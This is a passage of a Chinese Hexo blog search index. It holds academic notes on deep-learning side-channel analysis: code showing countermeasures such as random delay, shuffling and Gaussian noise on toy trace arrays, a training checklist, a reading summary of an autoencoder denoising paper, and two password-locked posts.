a7bb99cf89065f25812a955aeb96545f1909fd38e3f8281bd8b6b14ed8c1e08cbcbb6f67473c8b173d24098f68543a44036478cb99020659a6099f80f15b3d2935f9869c4375c9b5e75df658d1b0ab4ec161853463413715d4047334f68fdb616e4a2db6452ee00f7a984d6b18ea5a2d1e7c3091d65f7d50a4829865e2ec8f04fbeb5b466f1d75dedd10e6e530fe6ec3a5f6c91336e237a838393fa245a17bb6e515bf00e50a75eac05201fb4a911bb4ed14cb27e05c42c29e07ddfff4edec2bd489052a583cd6d0515cd574b0aa5460ffe05e76803d1755a960edf3646dde0dfa2139fb043c8d85bc4afbd7823fdf1b757ccf271d4f2c1bddfafd208e4b733a25fa61dda93c641a8d986aa8763ae13adfabe54c0a19fb80a3dff3a8ac82b07eaa1976aa75c8cf8381ef6592707fcbe456176869e9001318f86b04d964938e3e1d969052d19ef908c409deee922466cc36c61bf5ed49dca2434f3e013e0ec5a71c27ac3457481c8072b1609199d98f01b2531a4ca2c6998d51f98da7ade00ea10395d77eb32df6da8eb38aa62454a448718fd9c3c366cd66a731ee385694afeb97c301bf9a2f83fe6babe50fb96dbb8451015c59c2f6471bdc9c851f20c691d86266b3e63c83d13bc5c7272102599521d83215ae6feb9d7dd517ae0009590669f0002ee46753e2f95ad01b6c8472a3c7a754ad8dd4233688dde49247664b29da590ba09bf20e89c22eddbc661450b739ce3d345cd8ea22a07830eea54e2b5a1e04f240d13c8eeaca52edd845d0602317c8dd708d4f9fd4a158e8df052290bb2b4da3278898f8f971bdca4a3f674750b9abc04ecc68905063b1c4e63bb73d9b89ad2f96e0d14c3df78dfe47458ab189cc97089244f1f10bb32cabb06cba1cd9d2eaeee8d1e946b17a800422ddc67eee9404b4228667b1076921541ad1b7b5874bb1f8840291ad8717dd91d2901ca5746f322fe91db8f216685d7a0cbfc8ff35b161024c917c080fcff6316dd69c36da151b5816359200cce0fa33bee4ef7890c3b8f41497b0a5d1b61ac773c9fb4b007a53e027a8addc9c02e8cb7ce523e11f511ca3839cf4fb45db22111ea83ab4b97c95247cdfe15d31faf74bb55b94af25fbf46a73169ced1c73761caadfda440a528b15ec2723ce3545f6dd33ad987f0174c96d25686a354ea4049bbedb6dc1ea926e89dc006c4fa595ab870a7b06b7f1ab8456085295fde936b239c4ce6244d4c3cf6eaaf284dc95b02823e4c0ee1955952a301066ca7afad7cccea759c6c1eeb3c48910f12ccc08dda57c24f4f203fea33f0be8487fccb77bbb5fa45319e93d6131a6ddb1e77433009985c807eff6d66c6d30368e949e002c32293b996388239c37af8563a4ae0f1873e070fd37f036f7627ef5bb71724880d55d6e96c96172747faa14d00eb9bb5dc1da83d60aca2a3ec28805c43352bb8812baf1e1501ff9120e572d8865e22b6186d9aafd1f5e624986565dec272e66607ed2755d91be4ff0cca44432794628a64794a6490b3bdf5bab0ccd8fe2485ff239ce7ada0e3e65bcf1e21558a69f654da236775579de3fef859b10d33e57e2ade94979b29b1f5851fd898fe13f0eb96b3083c9013a3350266417e1c76c125eef475ea5670e617e64abf9a742de2cd593f613322c23b9eadd61d7eb4d9a38ed108045f2e70ab4e661f2713f06901cb62dce6757e778b1aad079dfe3c24697de9942b74407da104382996beeae2cf88293d669db3c49ad93db43830824e692a104a7a5afbd739250655e37f5ae75cd691706cb7ff888a7b638efe74ce4c4e89c5cc2dac13a784e95b22d17a81eeab8cbf626fa3a75b410ecb3bc022a6c006ae3554084ca9a00d7f59048f7f8b24584277ddd137e8a39ef58c705816c9bea4b1585929563e1fc033a01a3857cdc36a63566ea379771560a4701ff5fd314a09a69a3eb89ee53830a5cb6dcfef7b8b2c104003128296555a64570c696f18c8527cfea78c6e5e826aa12020677a8b68b6511d85db8b240117cecd7db5bc9552a8f53f9df9fae6e18f511ce76041abcdd183cbca6638eada4e7be3d9367cd4bc04dd6aa79e1b390cae6c2e4a1ed6159855bab84a66c823810cf6ab06550260ef0db4bbbbf6ca2466ee39f107f93c12250c2d066941a6eb7e77cc5b3fc1c241a575c7c762c2b660abf9759baf8523e8faa18bdacb9995970463883cd439f15b</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-blink">
      <input class="hbe hbe-input-field hbe-input-field-blink" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-blink" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-blink" data-content="这里需要密码,Pay for me !!!.">这里需要密码,Pay for me !!!.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>基于深度学习的侧信道攻击</category>
      </categories>
      <tags>
        <tag>比赛</tag>
      </tags>
  </entry>
  <entry>
    <title>侧信道攻击对抗措施总结与实现</title>
    <url>/archives/e6c2944b.html</url>
    <content><![CDATA[<p>部分算法图来自<code>Remove Some Noise: On Pre-processing of Side-channel Measurements with Autoencoders</code><sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup></p>
<h1>随机延迟</h1>
<blockquote>
<p>Desynchronization</p>
</blockquote>
<p><img src="../img/image-20240425152559789.png" alt="随机延迟"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> mlscat <span class="keyword">import</span> security <span class="keyword">as</span> sec</span><br><span class="line"></span><br><span class="line">traces = np.array([[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>],[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]])</span><br><span class="line"></span><br><span class="line">sec.desynchronization(traces, <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">result:</span><br><span class="line">  array([[<span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">1.</span>, <span class="number">2.</span>, <span class="number">3.</span>,</span><br><span class="line">        <span class="number">4.</span>, <span class="number">5.</span>, <span class="number">6.</span>, <span class="number">7.</span>, <span class="number">8.</span>, <span class="number">9.</span>, <span class="number">1.</span>, <span class="number">2.</span>, <span class="number">3.</span>, <span class="number">4.</span>, <span class="number">5.</span>],</span><br><span class="line">       [<span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">1.</span>,</span><br><span class="line">        <span class="number">2.</span>, <span class="number">3.</span>, <span class="number">4.</span>, <span class="number">5.</span>, <span class="number">6.</span>, <span class="number">7.</span>, <span class="number">8.</span>, <span class="number">9.</span>, <span class="number">1.</span>, <span class="number">2.</span>, <span class="number">3.</span>]])</span><br></pre></td></tr></table></figure>
<h1>混洗</h1>
<blockquote>
<p>shuffling</p>
</blockquote>
<p><img src="../img/image-20240425154625392.png" alt="Shuffling"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> mlscat <span class="keyword">import</span> security <span class="keyword">as</span> sec</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">traces = np.array([[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>],[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]])</span><br><span class="line">sec.shuffling(traces, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">result:</span><br><span class="line">  array([[<span class="number">5</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>],</span><br><span class="line">       [<span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]])</span><br></pre></td></tr></table></figure>
<h1>噪声</h1>
<blockquote>
<p>Gaussian noise</p>
</blockquote>
<p><img src="../img/image-20240425150418384.png" alt="高斯噪声"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> mlscat <span class="keyword">import</span> security <span class="keyword">as</span> sec</span><br><span class="line"></span><br><span class="line">traces = np.array([[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>],[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]])</span><br><span class="line">sec.add_gaussian_noise(traces, <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">result:</span><br><span class="line">  array([[ <span class="number">19.55069733</span>, -<span class="number">14.02830505</span>,   <span class="number">5.82666492</span>,  <span class="number">13.60338306</span>,</span><br><span class="line">         -<span class="number">2.73098755</span>],</span><br><span class="line">       [ -<span class="number">5.00718689</span>, -<span class="number">13.57927608</span>, -<span class="number">28.39710617</span>,   <span class="number">3.92870256</span>,</span><br><span class="line">         <span class="number">29.85302353</span>]])</span><br></pre></td></tr></table></figure>
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p>L. Wu and S. Picek, “Remove Some Noise: On Pre-processing of Side-channel Measurements with Autoencoders,” <em>IACR Transactions on Cryptographic Hardware and Embedded Systems</em>, pp. 389–415, Aug. 2020, doi: <a href="https://doi.org/10.13154/tches.v2020.i4.389-415">10.13154/tches.v2020.i4.389-415</a>. <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>DLSCA</category>
      </categories>
      <tags>
        <tag>小饼干</tag>
      </tags>
  </entry>
  <entry>
    <title>训练检查清单</title>
    <url>/archives/5b8d4694.html</url>
    <content><![CDATA[<h2 id="训练检查清单（自用">训练检查清单（自用</h2>
<blockquote>
<p>每次模型的训练或多或少都会出问题，有时候猜测熵不收敛并不是模型的问题，好好检查训练的代码。</p>
</blockquote>
<h2 id="数据集">数据集</h2>
<p>读取数据集， shape、head都需要print，首先check数据集是否正确</p>
<p><strong>每次操作数据集之后</strong>：最好都check</p>
]]></content>
      <categories>
        <category>小饼干</category>
      </categories>
      <tags>
        <tag>基于深度学习的侧信道攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>文献阅读笔记-Remove Some Noise: On Pre-processing of Side-channel Measurements with Autoencoders</title>
    <url>/archives/6f94536a.html</url>
    <content><![CDATA[<h1>文章信息</h1>
<ul>
<li>作者：<strong>Lichao Wu and Stjepan Picek</strong></li>
<li>单位：<strong>Delft University of Technology, The Netherlands</strong></li>
<li>出处：<strong>IACR Transactions on Cryptographic Hardware and Embedded Systems,</strong></li>
<li>标题：<strong>Remove Some Noise: On Pre-processing of Side-channel Measurements with Autoencoders</strong></li>
</ul>
<blockquote>
<p>文章代码：<code>https://github.com/AISyLab/Denoising-autoencoder</code></p>
</blockquote>
<h1>研究问题</h1>
<p>在侧信道攻击中的对抗措施是否可以被视为噪声，利用自编码器对其进行降噪处理来提高模型攻击成功率。</p>
<blockquote>
<p>卷积自编码器可以做，可以尝试VAE、VQ-XXX、DAE等看效果，套到一个新方法上堆叠论文工作量。</p>
</blockquote>
<h1>创新内容</h1>
<ol>
<li>提出了一个卷积自编码器，该自编码器可以通过一定数量的能量迹来训练出能够减少或移除对抗措施的影响的模型。</li>
<li>黑盒状态下对能量迹进行降噪的技术。</li>
</ol>
<h1>文章内容</h1>
<blockquote>
<p>白盒： 攻击者可以控制加密设备上的各种防御措施</p>
<p>黑盒：更贴合实际情况，攻击者对防御措施未知</p>
</blockquote>
<p>卷积自编码器训练配置：</p>
<img src="../img/image-20240328100419360.png" alt="超参数" style="zoom:50%;" />
<p>在训练时，作者注意到深度过低会导致模型对噪声（对抗措施）的鲁棒性较差，以及存在过拟合的现象，因此作者选用较深层次的自编码器以及加入正则化。自编码器的架构如表2所示。</p>
<img src="../img/image-20240328101839013.png" alt="表2-卷积自编码器架构" style="zoom:50%;" />
<p>作者利用未收保护以及受保护的能量迹来对自编码器进行训练</p>
<ol>
<li>将原始能量迹记为<code>clean_traces</code>，加入对抗措施后的能量迹记为<code>noised_traces</code></li>
<li>对抗措施（代码里给了：Shuffling、RandomDelay、ClockJitter、GaussianNoise</li>
<li>模型fit(x = <code>noised_traces</code>, y = <code>clean_traces</code>) PS：也就是说，在输入noised_traces后，需要对应重构成<code>clean_traces</code></li>
<li>下游模型攻击</li>
</ol>
<h1>实验结果（白盒）</h1>
<p>作者采用的下游模型分别是<code>CNN_best</code>和<code>MLP_best</code></p>
<h2 id="高斯噪声">高斯噪声</h2>
<img src="../img/image-20240328115151690.png" alt="图1 加入高斯噪声后的能量迹以及猜测熵" style="zoom:50%;" />
<p>在加入高斯噪声后，猜测熵变大，CNN、TA_PCA需要1w+能量迹才能收敛。</p>
<img src="../img/image-20240328151724624.png" alt="图2 平均值降噪以及卷积自编码器降噪猜测熵收敛曲线" style="zoom:50%;" />
<p>利用平均值降噪以及自编码器降噪后的结果，这里可以看到自编码器效果要低于平均值降噪。</p>
<p>平均值降噪在CDAE里有介绍<code>https://link.springer.com/chapter/10.1007/978-3-030-41579-2_16</code></p>
<h2 id="随机延迟">随机延迟</h2>
<img src="../img/image-20240328154700749.png" alt="图3 随机延迟对策对猜测熵的影响" style="zoom:50%;" />
<h2 id="随机延迟中断">随机延迟中断</h2>
<img src="../img/image-20240328155755446.png" alt="image-20240328155755446" style="zoom:50%;" />
<img src="../img/image-20240328155814768.png" alt="image-20240328155814768" style="zoom:50%;" />
<h2 id="时钟抖动">时钟抖动</h2>
<img src="../img/image-20240328155906016.png" alt="image-20240328155906016" style="zoom:50%;" />
<h2 id="混洗">混洗</h2>
<img src="../img/image-20240328155920813.png" alt="image-20240328155920813" style="zoom:50%;" />
<img src="../img/image-20240328155939057.png" alt="image-20240328155939057" style="zoom:50%;" />
<h2 id="大综合">大综合</h2>
<img src="../img/image-20240328162218910.png" alt="shuffling - desynchronization - RDI - clock jitters Gaussian noise" style="zoom:50%;" />
<p><strong>整理一下这几个对抗措施软件实现方案</strong></p>
<p>整篇文章实验给的很足，工作量叠的很多，必须抄一下实验。</p>
<h1>实验结果（黑盒）</h1>
<blockquote>
<p>这里我目前还没有看到代码里体现的黑盒部分</p>
</blockquote>
<p>作者采用传统的去噪方法作为<code>clean traces</code>以此来替代白盒中原始能量迹，接下来的配置一样。</p>
<img src="../img/image-20240328163403667.png" alt="image-20240328163403667" style="zoom:50%;" />
<img src="../img/image-20240328163410384.png" alt="image-20240328163410384" style="zoom:50%;" />
<h1>总结</h1>
<p>实验部分没得说，工作量很大，作者给自编码器一个标签Y让模型学习从X到Y，从而尽可能消除X与Y的差异。</p>
]]></content>
      <tags>
        <tag>自编码器</tag>
      </tags>
  </entry>
  <entry>
    <title>文献阅读笔记-Cross-Device Profiled Side-Channel Attack with Unsupervised Domain Adaptation</title>
    <url>/archives/94330a47.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
  <script id="hbeData" type="hbeData" data-hmacdigest="1378520a843652132234dc94d4e50d975a65f925c701deac5a3dfe1575829401">f489e073913c83118513ae835244118e0f11c7735e9aaae4a8a95d8b023a2670cf0f5ef71fd93dea343885fa8665a2b92b495f76bb1778e4a05fb03e2225a2f811df5cbbd0f3a0222cb550ea28e03e68f3de4d80beb7c2c2c516b4b1e6f45bc14e865b03158f933d7d027901730624720112a44c1b9bc17ec008344fbdd5ba76a8989dac2813ef6528b35c4120a7f1f1f0f4b6d3238ce4fffd46ecc788be641031b604a04d4bc05085406222d3d53e198e54a8cdd708e73c72af128cba5dc1ba949d80a049fc3dee0991db557f7b43c47fe867f1991ddd6da2bbaaff954de5e70de2e40fc35276c7e37526fc8dcfadf070053333d0f2e5137ed7698ee4c12b2394a8915653d05bc4fa7611e8f08ee4471b16e067f12f3ef6000a7999bfdfb16fcb4952a6f2effb88ce0f56a1d550f72739ed9c0bcc1487bba167b52d4bbd037864d74922e0fd0e58e798afefa6fc65c846d7e2a3d987a771510c4cd35a8c78c20eaf87c56d3d631be7aa9a5df1976b4d12c05c8c9454a188ef9b3ad34ad82d12a4f50deb3954c31d5be0bc2d29654375401001e50f3fe72a5670ea82748be208799e6412ecf592639e8e0bca9317b697c5a2976428e3a6c46e21036b1439604ffafd60f77f841f64d8708843ba2caf82c4c1ba41082e4800e73da2104ca936e8832203019f5b94c1fce00261f3986705199d6fa81d372b93263de6fb015a8a9371643ac6480965fb9bccef9481bdb910fcfea13ab1d33522fe05840a2dd211f69499324a0df95b5eb6692fdba6a867bad99329768603e0ea8ccf048330389a0a3befde04d7e4b87db990e9a4b95a4d16eff87c1ba604777913bceb088ec7d718f563e8c29098c7507e119b3c9b88e1f3761a717c09c872f7dbd839f3701fd90bf58ddf236784d989fdefe7d40d5a7ef72e82686a1bfdf241a96b7b264d1c7f8c5ebbc1b783f9372b62039220ac6a08a7bf9cdb559cca0d536a7d71f1e26652fbc9b8b20189507e9323c096e8ca77b6ece1bdb95675fffeb27cb8d082630075774da17d208e8b0f0524436a5a62ff5b9b27792cc1823324a0b1a9b884408b6f2ced7edafb2fcbc878228241b3fa34d38301a74861cd03d6968b62fcb60e33e0abf256aa566bc963b4feaa39953aa939515f35fcdff016de2cd92ff8877bcdf3077f04e00e4c6591300824b29baf8d1996bac33730c238ac5aa65b49598d19680b1568df9842a41df493715668abab68f19013a12354d30c812ee14109f6f2c20ac565a25eb2ce74b649f0c42558adad553f925f6ea48de3d0c878ab21cb5a75b9077b31cd27c9ba067b3122a2e3eea54f8041541ade6d8516e30ac53ec0d3e1fb9df83269083d57dedb9d50c6f4f26dc83c3589399438b40d10722bf65b640e9aae2b6176ad7780e08d7f312ddd5545aebb5b365146e9369c3c0e8e388b367d84f11948b16e9e12f179237f68b6ed62c85bd863c26030c1241bc8fcd46fcf5e5d70bfde3281477586bbddbf33a32535df50e091b780336a282701b2fea488a4c4e5c9c33f15f4cdf87c7ebe8ee30de836f03d298d382d7d3ddbac806c28b67467fadbca8bca9e6b199ac94a7f9cfe1bf61bc6392371742e882f0e3993521a0209e82707e9335e49c247acafa249ea49dca20afe721fd4d2ae9c3c58a55a737390992c809816e6ca0ce2f1cd8b45e50eb4d49ee4bac9798230cb82eaeb589c4eb70181684e0df4eb5a351bc6b24fc906681a49d582e12f68fa3094d02522d8a75042e81752307e4c7fe8cf674ef758acf917dc11c63d61b26e6a58527f4c4fa075ddd9bf9c7846c8171a884e59094a8c532df6e2eb2f0c113d6cb35044e212acb910ec453eb0ce566e03bd32993ed69493e6d59124705da0e75c6b973bf43924ae2c9fb518458ed72b38aaf1e0f35935a5a8a515e2c0586e658beb9d9632970ebbe7ce30a5598f2d0c7c10c4fff7115b8e2132bcfe84f17e45419eeda959079778addf710ea50b688f12ea9ce7d81e4b4e03b6a093df0ca301fa9297b3457b7b928ea8a6e6cb882725ef93da8eff040877c9ec90aa76c3342eec81bfa713187185826879a63e53328839f1983afac30fd2be012baa1c2f00a08f13b4dc12c96cfa2a88b49a91b72df7f50a8c60185bf2244e109713a4306d94b2adb0284db1c0305cdd34b5cb3cf4e4e5f27862d1ed62b4adfae271ed74c7be9e84ce0ec6bad381d6584556cdf01a4c5b2d294cdaa95ccb20e757709566d2bd3a47ba96bf160760b95476b9fee95c151a51f3a30a567493af64d7ae4e335a81b37414ab49702fe2b298d2d9bc5f1fe0ec5e86b6f01982eb79354ce49789d6c9b251c3024c97879444c5203e6d10a65d4354819843a26d5b7d2adb4fba26f42f27894ab1dcce03b3</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-blink">
      <input class="hbe hbe-input-field hbe-input-field-blink" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-blink" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-blink" data-content="这里需要密码,Pay for me !!!.">这里需要密码,Pay for me !!!.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>基于深度学习的侧信道攻击</category>
      </categories>
      <tags>
        <tag>跨设备侧信道攻击</tag>
      </tags>
  </entry>
</search>
